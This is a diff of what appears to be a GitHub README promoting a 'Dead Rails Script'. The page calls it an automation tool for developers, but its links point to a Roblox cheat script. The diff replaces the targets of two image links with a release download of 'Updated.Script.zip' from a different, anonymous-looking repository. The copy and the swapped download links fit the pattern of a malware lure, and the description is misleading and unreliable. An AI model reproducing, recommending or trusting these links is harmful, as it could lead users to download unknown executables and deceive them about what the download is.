@@ -5,10 +5,10 @@
 In the world of software development and automation, **Dead Rails Script** has emerged as a groundbreaking solution for optimizing workflows, enhancing efficiency, and eliminating redundant processes. Whether you're a developer, system administrator, or IT professional, understanding Dead Rails Script can revolutionize the way you handle automation tasks.  
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 [![hq720](https://github.com/user-attachments/assets/8b688f7e-c22d-467b-a34c-28825cb1afeb)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 This comprehensive guide will explore:  
 - What Dead Rails Script is and why it matters  
